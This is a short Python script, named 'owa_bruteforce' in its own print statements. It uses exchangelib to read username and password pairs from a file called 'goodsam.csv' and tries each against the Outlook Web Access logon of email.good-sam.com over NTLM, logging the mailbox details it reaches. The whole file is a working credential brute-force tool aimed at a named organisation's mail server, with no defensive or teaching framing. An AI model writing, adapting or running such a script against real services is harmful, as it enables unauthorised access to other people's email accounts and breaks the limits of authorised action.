from datetime import timedelta
from exchangelib import DELEGATE, IMPERSONATION, Account, Credentials, ServiceAccount, \
    EWSDateTime, EWSTimeZone, Configuration, NTLM, CalendarItem, Message, \
    Mailbox, Attendee, Q, ExtendedProperty, FileAttachment, ItemAttachment, \
    HTMLBody, Build, Version

import logging
logging.basicConfig(level=logging.DEBUG)

with open('goodsam.csv', 'r') as cred:
    creds = cred.readlines()

for account in creds:
    print("11 owa_bruteforce account: " + str(account))
    parts = account.split(",")
    username = parts[0]
    password = parts[1]

    credentials = Credentials(username=username, password=password)
    print("17 owa_bruteforce")

    version = Version(build=Build(15, 0, 12, 34))
    config = Configuration(server='email.good-sam.com/owa/auth/logon.aspx', credentials=credentials, version=version, auth_type=NTLM)
    print("23 owa_bruteforce")
    account = Account(primary_smtp_address=username, config=config, autodiscover=False, access_type=DELEGATE)#, verify_ssl=False)
    print("24 owa_bruteforce.py account: " + str(account))

    ews_url = account.protocol.service_endpoint
    ews_auth_type = account.protocol.auth_type
    primary_smtp_address = account.primary_smtp_address

    print("31 owa_bruteforce primary_smtp_address: " + str(primary_smtp_address))

